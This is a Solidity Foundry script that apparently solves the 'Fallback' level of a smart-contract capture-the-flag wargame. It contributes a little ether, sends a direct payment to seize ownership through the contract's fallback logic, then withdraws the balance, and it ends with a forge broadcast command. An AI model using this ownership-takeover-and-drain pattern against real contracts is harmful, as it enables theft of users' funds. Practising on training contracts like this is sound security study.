// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../src/Lv-01/Fallback.sol";

contract FallbackScript is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN FALLBACK INSTANCE ADDRESS
        Fallback _fallback = Fallback(payable(0xfff90856B33360AE10802B720c976a9022E0E040));

          _fallback.contribute{value: 100_000}();
        address(_fallback).call{value: 1}("");
        _fallback.withdraw();
      
        vm.stopBroadcast();
    }
}


//Run  forge script script/Fallback.s.sol:FallbackScript --rpc-url "" --private-key "" --broadcast  -vvvv

